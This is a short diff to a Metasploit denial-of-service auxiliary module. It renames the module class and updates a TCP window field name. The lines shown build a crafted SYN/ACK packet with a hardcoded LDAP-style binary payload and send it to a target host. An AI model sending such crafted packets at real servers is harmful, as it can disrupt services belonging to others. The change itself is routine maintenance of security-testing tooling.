@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Capture
   include Msf::Auxiliary::Dos
@@ -49,7 +49,7 @@ class Metasploit3 < Msf::Auxiliary
     p.tcp_flags.syn = 1
     p.tcp_flags.ack = 1
     p.tcp_dport = datastore['RPORT'].to_i
-    p.tcp_window = 3072
+    p.tcp_win = 3072
     p.payload = "0O\002\002;\242cI\004\rdc=#{m},dc=#{m}\n\001\002\n\001\000\002\001\000\002\001\000\001\001\000\241'\243\016"
     p.recalc
     capture_sendto(p, rhost)
